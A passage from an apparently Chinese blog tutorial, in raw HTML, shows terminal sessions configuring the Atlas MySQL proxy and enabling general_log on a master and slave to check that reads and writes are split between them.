FROM clients      | lists the clients                                       |</span></span><br><span class="line"><span class="string">| ADD CLIENT $client         | example: &quot;add client 192.168.1.2&quot;, ...                  |</span></span><br><span class="line"><span class="string">| REMOVE CLIENT $client      | example: &quot;remove client 192.168.1.2&quot;, ...               |</span></span><br><span class="line"><span class="string">| SELECT * FROM pwds         | lists the pwds                                          |</span></span><br><span class="line"><span class="string">| ADD PWD $pwd               | example: &quot;add pwd user:raw_password&quot;, ...               |</span></span><br><span class="line"><span class="string">| ADD ENPWD $pwd             | example: &quot;add enpwd user:encrypted_password&quot;, ...       |</span></span><br><span class="line"><span class="string">| REMOVE PWD $pwd            | example: &quot;remove pwd user&quot;, ...                         |</span></span><br><span class="line"><span class="string">| SAVE CONFIG                | save the backends to config file                        |</span></span><br><span class="line"><span class="string">| SELECT VERSION             | display the version of Atlas                            |</span></span><br><span class="line"><span class="string">+----------------------------+---------------------------------------------------------+</span></span><br><span class="line"><span class="string">16 rows in set (0.00 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mysql&gt; ^DBye</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini bin]&amp; mysql -h127.0.0.1 -uroot -P1234 -uroot -pccc.456</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.  Commands <span class="keyword">end</span> <span class="keyword">with</span> ; or \g.</span><br><span class="line">Your MySQL connection id is 2</span><br><span class="line">Server version: 5.0.81-log MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &apos;<span class="keyword">help</span>;&apos; or &apos;\h&apos; for help. <span class="keyword">Type</span> <span class="string">&apos;\c&apos;</span> <span class="keyword">to</span> <span class="keyword">clear</span> the <span class="keyword">current</span> <span class="keyword">input</span> statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| ha                 |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">| testdb             |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">6 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; ^DBye</span><br><span class="line">[root@ctos7mini <span class="keyword">bin</span>]&amp; mysql -h127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span> -uroot -P1234 -uroot -pccc<span class="number">.456</span></span><br><span class="line">mysql: [<span class="keyword">Warning</span>] <span class="keyword">Using</span> a <span class="keyword">password</span> <span class="keyword">on</span> the command line <span class="keyword">interface</span> can be insecure.</span><br><span class="line">Welcome <span class="keyword">to</span> the MySQL monitor.  Commands <span class="keyword">end</span> <span class="keyword">with</span> ; or \g.</span><br><span class="line">Your MySQL connection id is 3</span><br><span class="line">Server version: 5.0.81-log MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &apos;<span class="keyword">help</span>;&apos; or &apos;\h&apos; for help. <span class="keyword">Type</span> <span class="string">&apos;\c&apos;</span> <span class="keyword">to</span> <span class="keyword">clear</span> the <span class="keyword">current</span> <span class="keyword">input</span> statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; ^DBye</span><br><span class="line">[root@ctos7mini <span class="keyword">bin</span>]&amp; mysql -h127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span> -uroot -P1234 -uroot -pccc<span class="number">.456</span></span><br><span class="line">mysql: [<span class="keyword">Warning</span>] <span class="keyword">Using</span> a <span class="keyword">password</span> <span class="keyword">on</span> the command line <span class="keyword">interface</span> can be insecure.</span><br><span class="line">Welcome <span class="keyword">to</span> the MySQL monitor.  Commands <span class="keyword">end</span> <span class="keyword">with</span> ; or \g.</span><br><span class="line">Your MySQL connection id is 4</span><br><span class="line">Server version: 5.0.81-log MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &apos;<span class="keyword">help</span>;&apos; or &apos;\h&apos; for help. <span class="keyword">Type</span> <span class="string">&apos;\c&apos;</span> <span class="keyword">to</span> <span class="keyword">clear</span> the <span class="keyword">current</span> <span class="keyword">input</span> statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| ha                 |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">| testdb             |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">6 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&quot;%general_log%&quot;</span>;</span><br><span class="line">+<span class="comment">------------------+--------------------------------+</span></span><br><span class="line">| Variable_name    | Value                          |</span><br><span class="line">+<span class="comment">------------------+--------------------------------+</span></span><br><span class="line">| general_log      | OFF                            |</span><br><span class="line">| general_log_file | /var/lib/mysql/rhel_sqlsrv.log |</span><br><span class="line">+<span class="comment">------------------+--------------------------------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; ^DBye</span><br><span class="line">[root@ctos7mini <span class="keyword">bin</span>]&amp; mysql -h127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span> -uroot -P1234 -uroot -pccc<span class="number">.456</span></span><br><span class="line">mysql: [<span class="keyword">Warning</span>] <span class="keyword">Using</span> a <span class="keyword">password</span> <span class="keyword">on</span> the command line <span class="keyword">interface</span> can be insecure.</span><br><span class="line">Welcome <span class="keyword">to</span> the MySQL monitor.  Commands <span class="keyword">end</span> <span class="keyword">with</span> ; or \g.</span><br><span class="line">Your MySQL connection id is 5</span><br><span class="line">Server version: 5.0.81-log MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &apos;<span class="keyword">help</span>;&apos; or &apos;\h&apos; for help. <span class="keyword">Type</span> <span class="string">&apos;\c&apos;</span> <span class="keyword">to</span> <span class="keyword">clear</span> the <span class="keyword">current</span> <span class="keyword">input</span> statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&quot;%general_log%&quot;</span>;</span><br><span class="line">+<span class="comment">------------------+--------------------------------+</span></span><br><span class="line">| Variable_name    | Value                          |</span><br><span class="line">+<span class="comment">------------------+--------------------------------+</span></span><br><span class="line">| general_log      | OFF                            |</span><br><span class="line">| general_log_file | /var/lib/mysql/rhel_sqlsrv.log |</span><br><span class="line">+<span class="comment">------------------+--------------------------------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; ^DBye</span><br><span class="line">[root@ctos7mini <span class="keyword">bin</span>]&amp; mysql -h127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span> -uroot -P2345 -uroot -pccc<span class="number">.456</span></span><br><span class="line">mysql: [<span class="keyword">Warning</span>] <span class="keyword">Using</span> a <span class="keyword">password</span> <span class="keyword">on</span> the command line <span class="keyword">interface</span> can be insecure.</span><br><span class="line"><span class="keyword">ERROR</span> <span class="number">1045</span> (<span class="number">28000</span>): <span class="keyword">password</span> doesn<span class="string">&apos;t match</span></span><br><span class="line"><span class="string">[root@ctos7mini bin]&amp; mysql -h127.0.0.1 -uroot -P1234 -uroot -ppwd</span></span><br><span class="line"><span class="string">mysql: [Warning] Using a password on the command line interface can be insecure.</span></span><br><span class="line"><span class="string">ERROR 1045 (28000): Access denied for user &apos;</span>root<span class="string">&apos;@&apos;</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">37884</span><span class="string">&apos; (using password: YES)</span></span><br><span class="line"><span class="string">[root@ctos7mini bin]&amp; mysql -h127.0.0.1 -P2345 -uroot -ppwd</span></span><br><span class="line"><span class="string">mysql: [Warning] Using a password on the command line interface can be insecure.</span></span><br><span class="line"><span class="string">Welcome to the MySQL monitor.  Commands end with ; or \g.</span></span><br><span class="line"><span class="string">Your MySQL connection id is 1</span></span><br><span class="line"><span class="string">Server version: 5.0.99-agent-admin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Oracle is a registered trademark of Oracle Corporation and/or its</span></span><br><span class="line"><span class="string">affiliates. Other names may be trademarks of their respective</span></span><br><span class="line"><span class="string">owners.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Type &apos;</span><span class="keyword">help</span>;&apos; or &apos;\h&apos; for help. <span class="keyword">Type</span> <span class="string">&apos;\c&apos;</span> <span class="keyword">to</span> <span class="keyword">clear</span> the <span class="keyword">current</span> <span class="keyword">input</span> statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line">ERROR 1105 (07000): <span class="keyword">use</span> <span class="string">&apos;SELECT * FROM help&apos;</span> <span class="keyword">to</span> see the supported commands</span><br><span class="line">mysql&gt; ^DBye</span><br><span class="line">[root@ctos7mini <span class="keyword">bin</span>]&amp; mysql -h127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span> -P1234 -uroot -pccc<span class="number">.456</span></span><br><span class="line">mysql: [<span class="keyword">Warning</span>] <span class="keyword">Using</span> a <span class="keyword">password</span> <span class="keyword">on</span> the command line <span class="keyword">interface</span> can be insecure.</span><br><span class="line">Welcome <span class="keyword">to</span> the MySQL monitor.  Commands <span class="keyword">end</span> <span class="keyword">with</span> ; or \g.</span><br><span class="line">Your MySQL connection id is 7</span><br><span class="line">Server version: 5.0.81-log MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &apos;<span class="keyword">help</span>;&apos; or &apos;\h&apos; for help. <span class="keyword">Type</span> <span class="string">&apos;\c&apos;</span> <span class="keyword">to</span> <span class="keyword">clear</span> the <span class="keyword">current</span> <span class="keyword">input</span> statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| ha                 |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">| testdb             |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">6 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; ^DBye</span><br></pre></td></tr></tbody></table></figure><h2 id="&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x6D4B;&#x8BD5;"><a href="#&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x6D4B;&#x8BD5;" class="headerlink" title="&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x6D4B;&#x8BD5;"></a>&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x6D4B;&#x8BD5;</h2><p><strong>&#x5728;MySQL&#x4E3B;&#x5E93;&#x548C;&#x4ECE;&#x5E93;&#x5F00;&#x542F;general_log&#x65E5;&#x5FD7;&#xFF0C;&#x6CE8;&#x610F;&#x4E3B;&#x5E93;&#x548C;&#x4ECE;&#x5E93;general_log&#x65E5;&#x5FD7;&#x540D;&#x79F0;&#x4E0D;&#x540C;&#xFF01;</strong></p><p>&#x4E34;&#x65F6;&#x751F;&#x6548;<br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &apos;%general_log%&apos;;</span><br><span class="line">+<span class="comment">------------------+--------------------------------+</span></span><br><span class="line">| Variable_name    | Value                          |</span><br><span class="line">+<span class="comment">------------------+--------------------------------+</span></span><br><span class="line">| general_log      | OFF                            |</span><br><span class="line">| general_log_file | /var/lib/mysql/rhel_sqlsrv.log |</span><br><span class="line">+<span class="comment">------------------+--------------------------------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br><span class="line">mysql&gt; <span class="keyword">set</span> <span class="keyword">global</span> general_log=<span class="keyword">ON</span>;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6C38;&#x4E45;&#x751F;&#x6548;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel7 ~]&amp; echo &quot;general_log=ON&quot; &gt;&gt; /etc/my.cnf</span><br><span class="line">[root@rhel7 ~]&amp; echo &quot;general_log_file=/var/lib/mysql/rhel.log&quot; &gt;&gt; /etc/my.cnf</span><br><span class="line"></span><br><span class="line">[root@rhel_sqlsrv ~]&amp; echo &quot;general_log=ON&quot; &gt;&gt; /etc/my.cnf</span><br><span class="line">[root@rhel_sqlsrv ~]&amp; echo &quot;general_log_file=/var/lib/mysql/rhel_sqlsrv.log&quot; &gt;&gt; /etc/my.cnf</span><br><span class="line">[root@rhel_sqlsrv ~]&amp; systemctl restart mysqld</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &quot;%general_log%&quot;;</span><br><span class="line">+<span class="comment">------------------+--------------------------+</span></span><br><span class="line">| Variable_name    | Value                    |</span><br><span class="line">+<span class="comment">------------------+--------------------------+</span></span><br><span class="line">| general_log      | ON                       |</span><br><span class="line">| general_log_file | /var/lib/mysql/rhel7.log |</span><br><span class="line">+<span class="comment">------------------+--------------------------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; ^DBye</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x6E05;&#x7A7A;&#x6570;&#x636E;&#x5E93;&#x65E5;&#x5FD7;</strong>&#xFF1A;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel7 ~]&amp; echo &gt; /var/lib/mysql/rhel7.log</span><br><span class="line"></span><br><span class="line">[root@rhel_sqlsrv ~]&amp; echo &gt; /var/lib/mysql/rhel_sqlsrv.log</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x6D4B;&#x8BD5;</strong>&#xFF1A;</p><p>Master&#xFF08;rw&#xFF09;:<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel7 ~]&amp; tail -f /var/lib/mysql/rhel7.log</span><br></pre></td></tr></tbody></table></figure><p></p><p>Slave&#xFF08;ro&#xFF09;:<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel_sqlsrv ~]&amp; tail -f /var/lib/mysql/rhel_sqlsrv.log</span><br></pre></td></tr></tbody></table></figure><p></p><p>Atlas:<br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini mysql-proxy]<span class="comment"># mysql -h127.0.0.1 -P1234 -uroot -p</span></span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MySQL monitor.  Commands <span class="keyword">end</span> <span class="keyword">with</span> ; or \g.</span><br><span class="line">Your MySQL connection id is 9</span><br><span class="line">Server version: 5.0.81-log MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &apos;<span class="keyword">help</span>;&apos; or &apos;\h&apos; for help. <span class="keyword">Type</span> <span class="string">&apos;\c&apos;</span> <span class="keyword">to</span> <span class="keyword">clear</span> the <span class="keyword">current</span> <span class="keyword">input</span> statement.</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>ro:<br>slave&#x68C0;&#x6D4B;&#x5230;&#x8BFB;&#x64CD;&#x4F5C;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel_sqlsrv ~]&amp; tail -f /var/lib/mysql/rhel_sqlsrv.log</span><br><span class="line"></span><br><span class="line">2022-05-07T09:07:23.252345Z        13 Connect   root@192.168.73.20 on  using TCP/IP</span><br><span class="line">2022-05-07T09:07:23.252973Z        13 Query     SET CHARACTER_SET_CONNECTION=utf8</span><br><span class="line">2022-05-07T09:07:23.254053Z        13 Query     SET CHARACTER_SET_RESULTS=utf8</span><br><span class="line">2022-05-07T09:07:23.258100Z        13 Query     SET CHARACTER_SET_CLIENT=utf8</span><br><span class="line">2022-05-07T09:07:23.259321Z        13 Query     select @@version_comment limit 1</span><br></pre></td></tr></tbody></table></figure><p></p><p>rw:<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel7 ~]# tail -f /var/lib/mysql/rhel7.log</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5728;Atlas&#x8FDB;&#x884C;&#x8BFB;&#x64CD;&#x4F5C;:<br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| ha                 |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">| testdb             |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">6 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">use</span> testdb</span><br><span class="line">Reading <span class="keyword">table</span> information <span class="keyword">for</span> completion <span class="keyword">of</span> <span class="keyword">table</span> <span class="keyword">and</span> <span class="keyword">column</span> <span class="keyword">names</span></span><br><span class="line">You can turn <span class="keyword">off</span> this feature <span class="keyword">to</span> <span class="keyword">get</span> a quicker <span class="keyword">startup</span> <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line"><span class="keyword">Database</span> <span class="keyword">changed</span></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">| Tables_in_testdb |</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">| book             |</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> book;</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">| name                    | price | pages |</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">| Linux                   |    30 |   666 |</span><br><span class="line">| Cloud Computing         |    60 |   666 |</span><br><span class="line">| Operation System        |    80 |   666 |</span><br><span class="line">| Artificial Intelligence |   166 |   666 |</span><br><span class="line">| Linux                   |    66 |   666 |</span><br><span class="line">| Unix                    |    77 |   777 |</span><br><span class="line">| abc                     |   123 |   456 |</span><br><span class="line">| def                     |    83 |   364 |</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">8 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>Slave&#x68C0;&#x6D4B;&#x5230;&#x8BFB;&#x64CD;&#x4F5C;&#xFF1A;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel_sqlsrv ~]# tail -f /var/lib/mysql/rhel_sqlsrv.log</span><br><span class="line"></span><br><span class="line">2022-05-07T09:07:23.252345Z        13 Connect   root@192.168.73.20 on  using TCP/IP</span><br><span class="line">2022-05-07T09:07:23.252973Z        13 Query     SET CHARACTER_SET_CONNECTION=utf8</span><br><span class="line">2022-05-07T09:07:23.254053Z        13 Query     SET CHARACTER_SET_RESULTS=utf8</span><br><span class="line">2022-05-07T09:07:23.258100Z        13 Query     SET CHARACTER_SET_CLIENT=utf8</span><br><span class="line">2022-05-07T09:07:23.259321Z        13 Query     select @@version_comment limit 1</span><br><span class="line">2022-05-07T09:13:04.634499Z        13 Query     show databases</span><br><span class="line">2022-05-07T09:13:09.313174Z        13 Query     SELECT DATABASE()</span><br><span class="line">2022-05-07T09:13:09.314061Z        13 Init DB   testdb</span><br><span class="line">2022-05-07T09:13:09.316061Z        13 Init DB   testdb</span><br><span class="line">2022-05-07T09:13:09.316710Z        13 Query     show databases</span><br><span class="line">2022-05-07T09:13:09.317592Z        13 Init DB   testdb</span><br><span class="line">2022-05-07T09:13:09.318360Z        13 Query     show tables</span><br><span class="line">2022-05-07T09:13:09.319468Z        13 Init DB   testdb</span><br><span class="line">2022-05-07T09:13:09.320217Z        13 Field List        book</span><br><span class="line">2022-05-07T09:13:16.960823Z        13 Init DB   testdb</span><br><span class="line">2022-05-07T09:13:16.962628Z        13 Query     show tables</span><br><span class="line">2022-05-07T09:13:20.799873Z        13 Init DB   testdb</span><br><span class="line">2022-05-07T09:13:20.800737Z        13 Query     select * from book</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5728;Atlas&#x8FDB;&#x884C;&#x5199;&#x64CD;&#x4F5C;&#xFF1A;<br></p><figure class="highlight"><table><tbody><tr><td 